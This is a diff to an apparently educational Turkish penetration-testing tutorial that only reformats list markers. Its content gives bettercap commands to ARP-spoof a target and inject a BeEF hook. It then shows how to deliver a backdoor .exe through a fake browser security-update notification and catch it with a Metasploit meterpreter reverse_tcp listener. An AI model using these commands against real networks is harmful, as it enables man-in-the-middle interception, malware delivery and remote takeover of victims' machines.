@@ -31,15 +31,15 @@ Nasıl çalışır?
 
 //
 
-> > beefcustom.cap
+- > > beefcustom.cap
 
-> set arp.spoof.fullduplex true
-> set arp.spoof.targets 10.0.2.4 //hedef ip girilir
-> set http.proxy.script beefcustom.js
-> http.proxy on
-> sleep 1
-> arp.spoof on
-> ""
+- > set arp.spoof.fullduplex true
+- > set arp.spoof.targets 10.0.2.4 //hedef ip girilir
+- > set http.proxy.script beefcustom.js
+- > http.proxy on
+- > sleep 1
+- > arp.spoof on
+- > ""
 
 //
 
@@ -68,7 +68,7 @@ res.Body = body.replace(
 
 - Bu dosyalar /usr/share/bettercap/caplets altına klasör halinde yapıştır bu iki dosyayı. Klasöre beefcustom ismi verilir (opsiyonel)
 
-> bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap //tüm işlemleri kendi yapar. Test ortamında kullanıcı bir web sayfasını HTTP üzerinden ziyaret ettiğinde, tarayıcı oturumu BeEF paneline yönlendirilir ve sistem “online browser” olarak yönetim arayüzünde görünür.
+- > bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/beefcustom/beefcustom.cap //tüm işlemleri kendi yapar. Test ortamında kullanıcı bir web sayfasını HTTP üzerinden ziyaret ettiğinde, tarayıcı oturumu BeEF paneline yönlendirilir ve sistem “online browser” olarak yönetim arayüzünde görünür.
 
 - Aktif tarayıcı seçildiğinde, sistemin desteklediği çeşitli test ve demo amaçlı komut modülleri “commands” paneli altında listelenir. Bu modüller, tarayıcı üzerinde gerçekleştirilebilecek yetenekleri simüle eder.
 
@@ -88,19 +88,19 @@ res.Body = body.replace(
 - Backdoor oluşturulur
 - Kali Web haline getirilir. Kali web klasörüne backdoor yerleştirilir. Backdoor bir web servisten indirilecektir.
 
-> service apache2 start
+- > service apache2 start
 
 - Beef'ten "Fake Notification Bar (crome)" açılır. Url: kısmına kali web .exe urlsi girilir. Url: "http:/10.2.0/backdoor/plugin.exe" , Notification Text:"Tarayıcı güvenlik güncellemesi yapınız."
 
-> msfconsole
-> use exploit/multi/handler
-> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp // Oluşturulan backdoor bilgileri
-> msf6 exploit(multi/handler) > show options
-> msf6 exploit(multi/handler) > set LHOST 192.168.64.2
-> msf6 exploit(multi/handler) > set LPORT 8080
-> msf6 exploit(multi/handler) > exploit -j -z
-> msf6 exploit(multi/handler) > session -l
-> msf6 exploit(multi/handler) > session -1
+- > msfconsole
+- > use exploit/multi/handler
+- > msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp // Oluşturulan backdoor bilgileri
+- > msf6 exploit(multi/handler) > show options
+- > msf6 exploit(multi/handler) > set LHOST 192.168.64.2
+- > msf6 exploit(multi/handler) > set LPORT 8080
+- > msf6 exploit(multi/handler) > exploit -j -z
+- > msf6 exploit(multi/handler) > session -l
+- > msf6 exploit(multi/handler) > session -1
 
 ## Kendimizi Nasıl Koruruz
 
